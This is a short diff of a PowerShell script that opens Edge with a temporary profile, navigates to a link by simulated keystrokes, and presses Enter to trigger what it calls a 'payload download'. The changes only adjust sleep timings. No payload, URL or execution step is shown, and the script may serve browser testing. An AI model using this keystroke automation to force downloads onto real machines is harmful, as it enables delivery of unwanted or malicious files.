@@ -3,8 +3,8 @@ $edgePath="${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe";$temp
 Add-Type -AssemblyName UIAutomationClient
 Write-Host "Opening pristine Microsoft Edge testing layout..."
 $edgeProcess=Start-Process -FilePath $edgePath -ArgumentList @($targetUrl,"--user-data-dir=$tempProfile","--no-first-run","--no-default-browser-check") -PassThru
-Write-Host "Waiting 5 seconds for page synchronization..."
-Start-Sleep -Seconds 5
+Write-Host "Waiting 3 seconds for page synchronization..."
+Start-Sleep -Seconds 3
 $Shell=New-Object -ComObject WScript.Shell;$Shell.AppActivate($edgeProcess.Id)
 Start-Sleep -Milliseconds 500
 Write-Host "Navigating to initial link tag element..."
@@ -26,6 +26,7 @@ $targetFound=$true;break
 }
 }
 if($targetFound){
+Start-Sleep -Milliseconds 500
 Write-Host "Striking payload download trigger..."
 $Shell.SendKeys("{ENTER}")
 }else{
